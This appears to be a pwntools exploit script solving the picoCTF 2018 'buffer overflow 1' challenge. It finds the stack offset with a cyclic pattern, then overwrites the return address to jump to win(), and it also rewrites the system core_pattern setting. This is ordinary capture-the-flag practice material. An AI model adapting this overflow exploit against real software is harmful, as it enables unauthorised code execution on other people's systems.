# https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/buffer%20overflow%201.md
import pwn
from pwn import *
import os

EXECUTABLE = "a.out"
LOCAL_PATH = "./"
REMOTE_PATH = "/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba/"


def get_process_path(is_ssh = False):
    if is_ssh or os.path.exists(REMOTE_PATH):
        return REMOTE_PATH + EXECUTABLE
    else:
        return LOCAL_PATH + EXECUTABLE

def get_process(ssh_user = None):
    is_ssh = ssh_user is not None
    path = get_process_path(is_ssh)
    params = {"argv": path, "cwd": os.path.dirname(path)}
    if is_ssh:
        s = ssh(host=SSH_SERVER, user=ssh_user)
        p = s.process(**params)
    else:
        p = process(**params)
    return p

def send_payload(proc, payload):
    proc.sendlineafter("Please enter your string:", payload)

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
	os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")

	proc = process(get_process_path())
	payload = pwn.cyclic(100)
	send_payload(proc, payload)
	proc.wait()
	offset = pwn.cyclic_find(proc.corefile.rip, n=8)
	log.info("Overflow offset: {}".format(offset))
	return offset

e = ELF(get_process_path())
log.info("Address of win(): 0x{:02X}".format(e.symbols["win"]))
offset = get_overflow_offset()

p = get_process()#args.ssh_user)
payload = pwn.fit({offset: e.symbols["win"]})
print(payload)
send_payload(p, payload)
print(p.recvall())
